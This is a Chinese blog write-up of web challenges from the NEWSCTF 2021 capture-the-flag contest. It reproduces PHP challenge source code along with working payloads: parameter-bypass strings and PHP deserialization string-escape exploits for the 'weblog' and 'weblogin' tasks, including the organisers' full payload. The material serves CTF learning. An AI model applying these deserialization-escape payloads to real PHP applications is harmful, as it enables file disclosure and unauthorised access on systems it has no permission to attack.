---
title: NEWSCTF_2021.6-Web复现
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/215153415.png'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-06-05 17:46:54
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-48496.jpg
---
虽然已经不打CTF了，但是还是要学习。比赛当天看了一遍题觉得还行，昨天wp出了来复现一下。
看了wp，题目难度中等，虽然都是见过的知识点，但是出的也很不错。

一、easy_web
这个就不说了，简单题。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210605183050.png)

    webp=123456&a[]=1&b[]=2&c=9223372036854775806

二、weblog

    <?php
    highlight_file(__FILE__);
    error_reporting(0);
    class B{
        public $logFile;
        public $initMsg;
        public $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="#--session end--#\n";
            $this->logFile =  $file;
            readfile($this->logFile);
            
        }
  
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }
  
        function __destruct(){
            echo "this is destruct";
        }
    }
    
    class A {
        public $file = 'flag{xxxxxxxx}';
        public $weblogfile;
        
        function __construct() {
            echo $this->file;
        }

        function __wakeup(){
            // self::waf($this->filepath);
            $obj = new B($this->weblogfile);

        }
 
        public function waf($str){
            $str=preg_replace("/[<>*#'|?\n ]/","",$str);
            $str=str_replace('flag','',$str);
            return $str;
        }

        function __destruct(){
            echo "this is destruct";
        }
    
    }
    class C {
        public $file;
        public $weblogfile;
    }
    class D{
        public $logFile;
        public $initMsg;
        public $exitMsg;
    }

    function is_serialized($data){
    
        $r = preg_match_all('/:\d*?:"/',$data,$m,PREG_OFFSET_CAPTURE);
        if(!empty($r)) {
            foreach($m[0] as $v){
                $a = intval($v[1])+strlen($v[0])+intval(substr($v[0],1));
                if($data[$a] !== '"')
                     return false;
            }
        }
        if(!is_string($data))
            return false;
        $data = trim($data);
        if('N;' === $data)
            return true;
        if(!preg_match('/^([adObis]):/',$data,$badions))
            return false;
        switch($badions[1]){
            case 'a':
            case 'O':
            case 's':
                if(preg_match( "/^{$badions[1]}:[0-9]+:.*[;}]\$/s", $data ) )
                    return true;
                break;
            case 'b':
            case 'i':
            case 'd':
                if(preg_match("/^{$badions[1]}:[0-9.E-]+;\$/", $data))
                    return true;
                break;
        }
        return false;
    
    }
    $log = $_GET['log'];
    if(!is_serialized($log)){
        die('no1');
    }
    $log1 = preg_replace("/A/","C",$log);
    $log2 = preg_replace("/B/","D",$log1);
    if(!unserialize($log2)){
        die('no2');
    }
    $log = preg_replace("/[<>*#'|?\n ]/","",$log);
    $log = str_replace('flag','',$log);
    $log_unser = unserialize($log);
    ?>

看着长，其实简单的很。
首先抛开waf不看。A类控制参数，B类readfile，而A类下wakeup下正好有个调用B类的obj。
所以直接

    <?php
    class A {
        public $file;
        public $weblogfile;
    }
    $a=new A();
    $a->weblogfile='flag.php';
    echo serialize($a);
    ?>

即可，但是肯定不会这么简单的，关键在这里：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606004129.png)

在前面用:<8绕过了

    $r = preg_match_all('/:\d*?:"/',$data,$m,PREG_OFFSET_CAPTURE);

之后，传到log2那里就变成了这样：

    O:1:"C":2:{s:4:"file";s:14:"flag{xxxxxxxx}";s:10:"weblogfile";s:<8:"fflaglag.php";}

显然这是无法成功反序列化的，我们需要让字符逃逸，长度为25
   
    ";s:10:"weblogfile";s:40:

利用flag和一堆符号都能换空的特点：

    <?php
    class A {
	    public $file='flagflagflagflagflagflag<';
	    public $weblogfile=';s:10:"weblogfile";s:<8:"flflagag.php";}';    
    }
    echo serialize (new A);
这样传到log2那里就变成了：

    O:1:"C":2:{s:4:"file";s:25:"flagflagflagflagflagflag<";s:10:"weblogfile";s:40:";s:10:"weblogfile";s:<8:"flflagag.php";}";}

变成了字符串的一部分，可以正常执行。
简单题。

三、weblogin
看了提示好像又是个php反序列化字符串逃逸。。。
这个我懂，反序列化逃逸好出并且看起来比较难，我最近也出了一个字符串逃逸的，不过没这么复杂。

源码很长，是一个处理用户的路由。这种很长的源码直接倒推，先找flag输出点：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141052.png)

看起来是要写个满足条件的文件才会输出flag。
全局搜索file_put，找到四个全是 file_put_contents($file,enc(serialize($p))); 
来看一下这个enc：

    function enc($str){
        $_str = '';
        for($i=0;$i<strlen($str);$i++){
            if ($str[$i] !== '='){
                $_str = $_str.'='.dechex(ord($str[$i]));
            }else{
                $_str = $_str.$str[$i].$str[$i+1].$str[$i+2];
                $i = $i+2;
            }
        }
        return $_str;
    } 

试一下：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141828.png)

转换成等号加16进制的ascii码。但是下面那个i+2很明显说明了不会处理已经编码过的，比如：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606141937.png)

有啥用呢，这就得看下面反序列化里面的伪协议：

    $p = unserialize(filter(file_get_contents('php://filter/read=convert.quoted-printable-decode/resource='.$file))); 

简单点说就是把上面编码过的解码，比如=31变成1，字符减少了两个。
接下来看控制生成文件的地方：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606153149.png)

datafile可控。

    class Action {
    public $data=array();
    public $username='Troy3e';
    public $password='Troy3e';
    public $datafile='flag01476f0ab4de69015b1b6e07a0e84095';
    public $act='register';
    }
    echo serialize(new Action());
    //O:6:"Action":5:{s:4:"data";a:0:{}s:8:"username";s:6:"Troy3e";s:8:"password";s:6:"Troy3e";s:8:"datafile";s:36:"flag01476f0ab4de69015b1b6e07a0e84095";s:3:"act";s:8:"register";}

但是在这里面action无法控制，然而我们可以控制username和password，还是那句话，永远不要相信用户的输入。

    <?php
    class Action {
        public $data=array('Troy3e','Troy3e');
        public $username='';
        public $password='';
        public $datafile='';
        public $act='';
        }
        echo serialize(new Action());
    ?>
    //O:6:"Action":5:{s:4:"data";a:2:{i:0;s:6:"Troy3e";i:1;s:6:"Troy3e";}s:8:"username";s:0:"";s:8:"password";s:0:"";s:8:"datafile";s:0:"";s:3:"act";s:0:"";}

到这其实就很明显了username处控制长度逃逸出数组，password里面是我们控制的反序列化的内容。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606160638.png)

十个。后面就不多说了，直接贴个官方payload：

    username==50=50=50=50=50&password=a";s:1:"a";}s:8:"username";s:9:"lastsward";s:8:"password";s:9:"lastsward";s:8:"datafile";s:36:"flagf528764d624db129b32c21fbca0cb8d6";s:3:"act";s:8:"register";}

四、impossible ip
后面那个ssrf打fpm已经做烂了就不讲了，看一下前面这个socket。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210606162314.png)

这个知识点我倒是没见过，学习了。


总结：
闲着没事，就看四个。这几个还是比较简单的。
溜了，学习去了。




